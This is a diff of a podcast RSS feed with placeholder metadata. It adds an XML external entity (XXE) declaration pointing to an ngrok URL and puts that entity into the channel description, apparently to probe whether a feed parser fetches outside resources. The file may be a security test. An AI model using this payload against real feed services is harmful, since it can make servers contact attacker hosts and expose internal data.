@@ -1,5 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE title [ <!ELEMENT title ANY >
+<!ENTITY xxe SYSTEM "https://isopentyl-uncarved-chiquita.ngrok-free.dev/test.jpg" >]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:googleplay="http://www.google.com/schemas/play-podcasts/1.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" xmlns:media="http://search.yahoo.com/mrss/" xmlns:podaccess="https://access.acast.com/schema/1.0/" xmlns:acast="https://schema.acast.com/1.0/">
 <channel>
 	<ttl>60</ttl>
@@ -12,7 +13,7 @@
 	<itunes:author>TEST RSS AUTHOR</itunes:author>
 	<itunes:subtitle>SUB TITLE</itunes:subtitle>
 	<itunes:summary>SUMMARY TEST</itunes:summary>
-	<description>DESCRIPTION TEST</description>
+	<description>&xxe;</description>
 	<itunes:explicit>true</itunes:explicit>
 	<itunes:owner>
 		<itunes:name>OWNER TEST</itunes:name>
